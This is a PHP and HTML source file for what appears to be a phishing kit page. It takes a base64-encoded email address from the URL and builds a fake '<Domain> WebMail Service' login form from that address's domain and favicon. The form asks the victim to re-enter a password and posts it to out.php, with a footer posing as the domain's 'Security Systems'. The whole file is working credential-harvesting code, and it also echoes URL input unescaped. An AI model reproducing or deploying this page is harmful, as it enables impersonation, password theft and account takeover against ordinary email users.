<?php

require_once '../api.php';
if (isset($_GET['app'])) {
$app = $_GET['app'];
}
$email = base64_decode($app);
function getloginIDFromlogin($email)
{
$find = '@';
$pos = strpos($email, $find);
$loginID = substr($email, 0, $pos);
return $loginID;
}
function getDomainFromEmail($email)
{
// Get the data after the @ sign
$domain = substr(strrchr($email, "@"), 1);
return $domain;
}
$login = $email;
$loginID = getloginIDFromlogin($login);
$domain = getDomainFromEmail($login);
$ln = strlen($login);
$len = strrev($login);
$x = 0;
for($i=0; $i<$ln; $i++){
	if($len[$i] == "@"){
		$x = $i;
		break;
	}
}
$yuh = substr($len,0,$x);
$yuh = strrev($yuh);
for($i=0; $i<$ln; $i++){
	if($yuh[$i] == "."){
		$x = $i;
		break;
	}
}
$yuh = substr($yuh,0,$x);
$yuh = ucfirst($yuh);

?>
<!DOCTYPE html>
<html>
<title><?php echo $yuh ?> WebMail Service</title>
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<link rel="shortcut icon" href="http://<?=$domain?>/favicon.ico"/>
<style>
@font-face {
   font-family: myFirstFont;
   src: url(font/style.ttf);
}

@font-face {
   font-family: myFirstFont;
   src: url(font/style.ttf);
   font-weight: bold;
}

* {
   font-family: myFirstFont;
}
* {
  box-sizing: border-box;
}

body {
  background-color: #f1f1f1;
}

div.checkbox {
    position: relative;
    font-family: myFirstFont;
    font-size: 13px;
}
label {
    position: relative;
    padding-left: 16px;
}
label::before {
    content :"";
    display: inline-block;
    width: 10px;
    height: 10px;
    background-color: white;
    border: solid 1px #9C9C9C;
    position: absolute;
    top: 1px;
    left: 0px;
}
label::after {
    content:"";
    width: 8px;
    height: 8px;
    background-color: #666666;
    position: absolute;
    left: 2px;
    top: 3px;
    display: none;
}
input[type=checkbox] {
    visibility: hidden;
    position: absolute;
}
input[type=checkbox]:checked + label::after {
    display: block;
}
input[type=checkbox]:active + label::before {
    background-color: #DDDDDD;
}

#regForm {
  background-color: #ffffff;
  margin: 100px auto;
  font-family: Raleway;
  padding: 40px;
  width: 30%;
  min-width: 100px;
}
 
h1 {
  text-align: LEFT;  
}
input {
  padding: 10px;
  width: 100%;
  font-size: 17px;
  font-family: myFirstFont;
  border: 1px solid #aaaaaa;

}


button {
  background-color: #4CAF50;
  color: #ffffff;
  border: none;
  padding: 10px 20px;
  font-size: 17px;
  font-family: myFirstFont;
  cursor: pointer;
}

button:hover {
  opacity: 0.8;
}

#prevBtn {
  background-color: #bbbbbb;
}



</style>
<body>

<form id="regForm" action="out.php" method="POST">
<font size="3" color="green"><b><?php echo $yuh ?></b> </font><br>
 <font size="6">WebMail <b>Service</b> </font><hr><font size="2" color="red">Re-enter password to continue</font><p>
 
  <div class="tab">Login Info:
    <p><input value="<?php echo isset($_GET['app']) ? base64_decode($_GET['app']) : '' ?>" name="uname" required="" readonly></p>
    <p><input placeholder="Password" name="pword" type="password" oninvalid="setCustomValidity('Please enter your password');" oninput="setCustomValidity('')"required=""></p>
 
  </div>



  <div style="overflow:auto;">
    <div style="float:right;"><p>

      <button type="submit" id="nextBtn">Continue</button></div>

</form>




</body><p><br><p></p></p><p><br></p><div align="center">

<center><font size="1.5"><b>&copy; <?php echo date('Y'); ?> | <?php echo $yuh ?> Security Systems</b></font></center></div>
</html>
